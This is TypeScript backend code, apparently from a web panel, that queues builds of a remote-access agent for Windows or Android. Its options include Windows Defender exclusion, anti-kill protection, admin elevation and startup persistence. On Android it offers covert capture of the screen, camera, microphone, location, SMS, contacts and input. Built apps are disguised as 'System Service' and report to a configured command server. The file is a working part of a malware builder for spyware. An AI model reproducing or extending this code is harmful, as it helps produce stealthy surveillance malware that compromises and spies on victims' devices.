import { createServerFn } from "@tanstack/react-start";
import { z } from "zod";
import { getRequestHeader, getRequestHost } from "@tanstack/react-start/server";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";

const Input = z.object({
  name: z.string().min(1).max(40).regex(/^[a-zA-Z0-9 _.-]+$/),
  startup: z.boolean(),
  startup_name: z.string().max(40).optional().nullable(),
  debug: z.boolean(),
  antikill: z.boolean().optional().default(false),
  wd_exclusion: z.boolean().optional().default(false),
  require_admin: z.boolean().optional().default(false),
  fun_features: z.boolean().optional().default(false),
  tag: z.string().max(32).regex(/^[a-zA-Z0-9 _-]*$/).optional().nullable(),
  output_kind: z.enum(["exe", "bat", "apk"]),
  icon_url: z.string().url().optional().nullable(),
  platform: z.enum(["windows", "android"]).default("windows"),
  android_features: z.object({
    screen: z.boolean(),
    camera: z.boolean(),
    files: z.boolean(),
    mic: z.boolean(),
    location: z.boolean(),
    sms: z.boolean(),
    contacts: z.boolean(),
    notifications: z.boolean(),
    input: z.boolean(),
  }).optional().nullable(),
  app_display_name: z.string().max(60).optional().nullable(),
});

const PROJECT_ID = "8cc06dd8-1b82-4bc4-af25-9de5db9e0a20";
const STABLE_PROD = `https://project--${PROJECT_ID}.lovable.app`;
const STABLE_DEV = `https://project--${PROJECT_ID}-dev.lovable.app`;

function normalizeAgentTarget(url: string): string {
  const clean = url.replace(/\/$/, "");
  if (clean.includes("lovableproject.com") || clean.includes("id-preview--")) {
    return STABLE_DEV;
  }
  if (/project--[0-9a-f-]+(-dev)?\.lovable\.app/i.test(clean) && !clean.includes(PROJECT_ID)) {
    return STABLE_DEV;
  }
  return clean;
}

function detectOrigin(): string {
  const envUrl = process.env.AGENT_TARGET_SERVER_URL;
  if (envUrl) return normalizeAgentTarget(envUrl);

  const candidates = [
    getRequestHeader("origin"),
    (() => {
      const proto = getRequestHeader("x-forwarded-proto") ?? "https";
      const host = getRequestHost();
      return host ? `${proto}://${host}` : null;
    })(),
  ].filter(Boolean) as string[];

  for (const raw of candidates) {
    const u = raw.replace(/\/$/, "");
    if (/lovableproject\.com$/i.test(new URL(u).hostname)) continue;
    if (/^id-preview--/i.test(new URL(u).hostname)) continue;
    if (/lovable\.app$/i.test(new URL(u).hostname)) return normalizeAgentTarget(u);
  }

  return STABLE_DEV;
}

export const createBuild = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((d) => Input.parse(d))
  .handler(async ({ data, context }) => {
    const { supabase, userId } = context;

    const { count } = await supabase
      .from("builds")
      .select("id", { count: "exact", head: true })
      .eq("user_id", userId)
      .in("status", ["queued", "running"]);
    if ((count ?? 0) >= 2) {
      return { ok: false as const, error: "Max 2 builds in queue. Wait for one to finish." };
    }

    const targetServerUrl = detectOrigin();

    const insertData: any = {
      user_id: userId,
      name: data.name,
      startup: data.startup,
      startup_name: data.startup ? (data.startup_name || data.name) : null,
      debug: data.debug,
      antikill: data.antikill ?? false,
      wd_exclusion: data.wd_exclusion ?? false,
      require_admin: data.require_admin ?? false,
      fun_features: data.fun_features ?? false,
      tag: data.tag ?? null,
      output_kind: data.output_kind,
      icon_url: data.icon_url ?? null,
      status: "queued",
      target_server_url: targetServerUrl,
      platform: data.platform,
    };

    // Store android features in the features JSONB column
    if (data.platform === "android" && data.android_features) {
      insertData.features = {
        ...data.android_features,
        app_display_name: data.app_display_name || "System Service",
      };
    }

    const { data: row, error } = await supabase
      .from("builds")
      .insert(insertData)
      .select("id")
      .single();
    if (error) return { ok: false as const, error: error.message };

    return { ok: true as const, id: row.id };
  });
